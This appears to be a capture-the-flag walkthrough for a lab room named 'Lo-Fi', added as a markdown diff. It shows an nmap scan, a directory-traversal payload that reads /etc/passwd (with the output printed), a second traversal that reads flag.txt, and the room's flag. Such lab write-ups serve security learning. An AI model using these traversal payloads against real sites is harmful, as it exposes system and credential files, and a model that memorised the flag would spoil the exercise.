@@ -1,0 +1,36 @@
+# Lo-Fi
+
+We get a hint that this room has a LFI Path vulnerability 
+
+nmap scan 
+
+```abap
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 64
+80/tcp open  http    syn-ack ttl 63
+```
+
+Visiting the website we see its a site that has music videos on youtube and a search bar.
+
+Above we see the url is suceptable to changing the query. So I run
+
+```abap
+http://lofi.thm/?page=../../../../etc/passwd
+```
+
+It gives back a return of 
+
+```abap
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh 
+```
+
+Confirmed it works I try 
+
+```abap
+http://lofi.thm/?page=../../../../flag.txt
+```
+
+Flag 
+
+> flag{e4478e0eab69bd642b8238765dcb7d18}
+>
